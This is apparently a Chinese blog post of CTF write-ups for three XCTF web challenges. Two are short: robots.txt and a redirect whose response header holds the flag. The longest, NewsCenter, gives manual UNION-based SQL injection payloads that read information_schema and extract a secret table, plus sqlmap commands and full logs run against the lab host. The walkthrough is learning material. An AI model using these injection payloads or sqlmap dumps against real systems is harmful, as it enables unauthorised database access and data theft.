---
layout:       post
title:        "Web进阶区Writeup及思路总结"
subtitle:     "Null"
date:         2020-02-23 11:10:12
author:       "NeptLiang"
header-img:   "img/home-bg.jpg"
header-mask:  0.3
catalog:      true
multilingual: true
tags:
    - sec
    - writeup
---


# 1. Training-WWW-Robots
**题目描述**：暂无

**WP**:
> **【原理】**  
> robots.txt  
>   
> **【目的】**  
> 学习robots.txt  
>   
> **【环境】**  
> windows  
>   
> **【工具】**  
> 浏览器  
>   
> **【步骤】**  
> 输入/robots.txt  
> 然后打开fl0g.php就可以看到flag:wWwrobots  
>   
> **【总结】**  
> robots.txt是一种君子协议  

**总结**：谢谢出题人的安慰。2020.2.23.Sun

---

# 2. baby_web
**题目描述**：想想初始页面是哪个

**WP**:
> **【实验原理】**  
> web请求头中的location作用  
>   
> **【实验目的】**  
> 掌握web响应包头部常见参数  
>   
> **【实验环境】**  
> Windows  
>   
> **【实验工具】**  
> firefox  
>   
> **【实验步骤】**  
> 1. 根据提示，在url中输入index.php,发现打开的仍然还是1.php
> 2. 打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到location参数被设置了1.php，并且得到flag。

**总结**：index.php的响应头如下
```
Connection: Keep-Alive
Content-Length: 17
Content-Type: text/html; charset=UTF-8
Date: Sun, 23 Feb 2020 03:15:42 GMT
FLAG: flag{very_baby_web}
Keep-Alive: timeout=5, max=100
Location: 1.php
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.21
```
页面自动跳转可能是因为设置了响应的Location头，线索可能在响应头里。2020.2.23.Sun

---

# 3. NewsCenter
**题目来源**： XCTF 4th-QCTF-2018  
**题目描述**：如题目环境报错，稍等片刻刷新即可  

**WP**:
> **目标**  
> 简单的SQL注入，读取 information_schema 元数据，然后读取flag。
sqlmap 也可解。
> 
> **环境**  
> windows
> 
> **工具**  
> sqlmap
> 
> **分析过程**
> 1. 初步探测,发现搜索框存在注入 ' union select 1,2,3 #
> 2. 获取数据库名，表名 ' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #
> 3. 获取news 表的字段名，数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#
> 4. 获取f1agfl4gher3 字段名 数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#
> 5. 得到flag ' and 0 union select 1,2,fl4g from secret_table #
> 
> sqlmap版本
> 1. 获取注入点
> sqlmap -u http://192.168.100.161:53459 --data "search=df"
> 2. 获取数据库信息
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
> 3. 获取库内表信息
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
> 4. 获取表内字段信息
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
> 5. 获取字段内容，得到flag
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump

**总结**：

手动注入：
1. 单引号找注入点，闭合单引号、用#或“-- ”（两杠后须有空格）注释
2. ```order by```测字段数
3. union select ```information_schema.columns```中的```table_schema```（数据库名）和```tabel_name```（表名），前面加```and 0```清除正常查询出的内容
4. union select ```information_schema.columns```中的```column_name```和```data_type```获取指定表的字段名和数据类型
5. 查表获得flag

SQLMAP使用：
* ```-u``` 指定目标url
* ```--data``` 指定请求体数据
* ```-dbs``` 获取数据库列表
* ```-D``` 指定数据库
* ```--tables``` 获取表列表
* ```-T``` 指定表
* ```--columns``` 获取字段列表
* ```-C``` 指定字段（字段名要加双引号）
* ```--dump``` 获取指定字段的值

SQLMAP部分试验记录（不知道为甚麽最后dump报500(Internal Server Error)错误）：
```
ming@Neptune:~$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck"  #1.获取注入点
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:49:51 /2020-02-24/

[10:49:51] [INFO] testing connection to the target URL
[10:49:52] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:49:52] [INFO] testing if the target URL content is stable
[10:49:52] [INFO] target URL content is stable
[10:49:52] [INFO] testing if POST parameter 'search' is dynamic
[10:49:52] [WARNING] POST parameter 'search' does not appear to be dynamic
[10:49:52] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[10:49:52] [INFO] testing for SQL injection on POST parameter 'search'
[10:49:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:49:53] [WARNING] reflective value(s) found and filtering out
[10:49:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:49:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:49:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:49:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:49:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:50:05] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:50:05] [INFO] testing 'MySQL inline queries'
[10:50:05] [INFO] testing 'PostgreSQL inline queries'
[10:50:05] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:50:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:50:05] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[10:50:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:50:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:50:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:50:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:50:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:50:38] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[10:51:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:52:26] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
[10:52:26] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[10:52:26] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[10:52:26] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:52:28] [INFO] target URL appears to have 3 columns in query
[10:52:28] [WARNING] applying generic concatenation (CONCAT)
[10:52:28] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[10:52:28] [INFO] checking if the injection point on POST parameter 'search' is a false positive
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
[10:57:37] [INFO] testing MySQL
[10:57:37] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[10:57:37] [INFO] confirming MySQL
[10:57:37] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[10:57:37] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 37 times
[10:57:37] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'

[*] ending @ 10:57:37 /2020-02-24/

ming@Neptune:~$ cd .sqlmap/output/111.198.29.45/;ls
log  session.sqlite  target.txt
ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat log
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
back-end DBMS: MySQL >= 5.0.0
ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat target.txt
http://111.198.29.45:37966/ (POST)  # /usr/bin/sqlmap -u http://111.198.29.45:37966/ --data search=fuck

search=fuckming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlite session.sqlite
Unable to open database "session.sqlite": file is encrypted or is not a database
ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat session.sqlite
SQLite format 3   @                                                                                                                                  SablestoragestorageCREATE TABLE storage (id INTEGER PRIMARY KEY, value TEXT   : 
cat: write error: Input/output error

ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -dbs  #2.获取数据库信息
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:05:52 /2020-02-24/

[11:05:52] [INFO] resuming back-end DBMS 'mysql'
[11:05:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
[11:05:52] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5
[11:05:52] [INFO] fetching database names
[11:05:53] [WARNING] reflective value(s) found and filtering out
available databases [2]:
[*] information_schema
[*] news

[11:05:53] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'

[*] ending @ 11:05:53 /2020-02-24/

ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -D news --tables  #3.获取库内表信息
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:10:05 /2020-02-24/

[11:10:05] [INFO] resuming back-end DBMS 'mysql'
[11:10:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
[11:10:05] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5
[11:10:05] [INFO] fetching tables for database: 'news'
[11:10:05] [WARNING] reflective value(s) found and filtering out
Database: news
[2 tables]
+--------------+
| news         |
| secret_table |
+--------------+

[11:10:05] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'

[*] ending @ 11:10:05 /2020-02-24/

ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -D news -T secret_table --columns  #4.获取表内字段信息
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:28:04 /2020-02-24/

[11:28:04] [INFO] resuming back-end DBMS 'mysql'
[11:28:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
[11:28:04] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5
[11:28:04] [INFO] fetching columns for table 'secret_table' in database 'news'
[11:28:04] [WARNING] reflective value(s) found and filtering out
Database: news
Table: secret_table
[2 columns]
+--------+------------------+
| Column | Type             |
+--------+------------------+
| fl4g   | varchar(50)      |
| id     | int(10) unsigned |
+--------+------------------+

[11:28:04] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'

[*] ending @ 11:28:04 /2020-02-24/

ming@Neptune:~/.sqlmap/output/111.198.29.45$ sqlmap -u http://111.198.29.45:37966/ --data "search=fuck" -D news -T secret_table -C fl4g --dump  #5.获取字段内容，不知为何报500(Internal Server Error)错误
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:33:32 /2020-02-24/

[11:33:32] [INFO] resuming back-end DBMS 'mysql'
[11:33:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
[11:33:32] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5
[11:33:32] [INFO] fetching entries of column(s) 'fl4g' for table 'secret_table' in database 'news'
[11:33:33] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[11:33:33] [WARNING] reflective value(s) found and filtering out
[11:33:33] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:33:33] [WARNING] unable to retrieve the entries of columns 'fl4g' for table 'secret_table' in database 'news'
[11:33:33] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[11:33:33] [INFO] fetched data logged to text files under '/home/ming/.sqlmap/output/111.198.29.45'

[*] ending @ 11:33:33 /2020-02-24/
ming@Neptune:~/.sqlmap/output/111.198.29.45$ ls
dump  log  session.sqlite  target.txt
ming@Neptune:~/.sqlmap/output/111.198.29.45$ cat log
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
back-end DBMS: MySQL >= 5.0.0
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
back-end DBMS: MySQL 5
available databases [2]:
[*] information_schema
[*] news

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
back-end DBMS: MySQL 5
Database: news
[2 tables]
+--------------+
| news         |
| secret_table |
+--------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
back-end DBMS: MySQL 5
Database: news
Table: secret_table
[2 columns]
+--------+------------------+
| Column | Type             |
+--------+------------------+
| fl4g   | varchar(50)      |
| id     | int(10) unsigned |
+--------+------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=fuck' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkqq','uYXXBbsqyJwnWLXouUHDDqcUPHRAikjSrvhtryFT'),'qqpbq')-- THEC
---
back-end DBMS: MySQL 5
ming@Neptune:~/.sqlmap/output/111.198.29.45$ ls
dump  log  session.sqlite  target.txt
ming@Neptune:~/.sqlmap/output/111.198.29.45$ ls dump/
ming@Neptune:~/.sqlmap/output/111.198.29.45$
```